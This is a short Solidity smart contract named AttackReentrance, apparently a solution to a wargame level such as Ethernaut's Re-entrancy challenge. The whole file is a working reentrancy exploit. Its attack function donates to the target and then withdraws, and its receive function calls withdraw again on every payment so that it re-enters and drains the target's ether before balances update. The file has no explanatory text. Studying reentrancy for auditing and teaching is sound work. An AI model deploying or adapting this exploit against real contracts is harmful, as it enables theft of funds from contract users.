// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface ReentranceInterface {
    function withdraw(uint256 _amount) external;
    function donate(address _to) external payable;
}

contract AttackReentrance{

    ReentranceInterface public reentrance;

    constructor(address _reentrance) public {
        reentrance = ReentranceInterface(_reentrance);
    }

    function attack() external payable{
        reentrance.donate{value:msg.value}(address(this));
        reentrance.withdraw(msg.value);
    }

    receive() external payable {
        reentrance.withdraw(msg.value);
    }
}